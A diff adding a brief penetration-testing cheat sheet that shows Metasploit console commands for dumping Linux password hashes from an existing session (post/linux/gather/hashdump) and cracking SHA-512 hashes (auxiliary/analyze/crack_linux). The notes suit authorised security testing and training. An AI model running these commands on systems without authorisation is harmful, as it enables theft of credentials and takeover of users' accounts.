@@ -1,0 +1,17 @@
+#### Dumping & Cracking Linux Hashes
+
+###### Dump linux Hashes with MSF
+
+> use post/linux/gather/hashdump 
+> set SESSION 1 
+> exploit
+
+Crack linux hashes
+
+> use auxiliary/analyze/crack_linux
+> 
+> set SHA512 true 
+> 
+> run
+
+
